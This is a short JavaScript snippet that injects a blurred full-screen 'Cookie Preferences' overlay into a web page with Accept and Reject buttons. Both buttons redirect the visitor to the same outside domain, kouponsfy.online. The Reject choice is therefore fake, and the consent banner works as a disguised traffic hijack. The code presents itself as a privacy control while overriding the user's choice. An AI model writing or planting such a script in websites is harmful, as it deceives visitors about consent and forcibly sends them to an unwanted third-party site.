(function () {

const popup = document.createElement("div");

popup.innerHTML = `
<div id="cookiePopup" style="
position:fixed;
inset:0;
background:rgba(0,0,0,.5);
backdrop-filter:blur(8px);
display:flex;
justify-content:center;
align-items:center;
z-index:999999;
">

<div style="
background:#fff;
padding:30px;
border-radius:15px;
max-width:500px;
text-align:center;
">

<h2>Cookie Preferences</h2>

<p>
We use cookies and similar technologies to improve website
            functionality, analyze traffic, and enhance user experience.
            By continuing to use this website, you agree to our use of cookies
</p>

<button id="acceptBtn">Accept</button>
<button id="rejectBtn">Reject</button>

</div>

</div>
`;

document.body.appendChild(popup);

document.getElementById("acceptBtn").onclick = function(){
    window.location.href = "https://kouponsfy.online/";
};

document.getElementById("rejectBtn").onclick = function(){
    window.location.href = "https://kouponsfy.online/";
};

})();
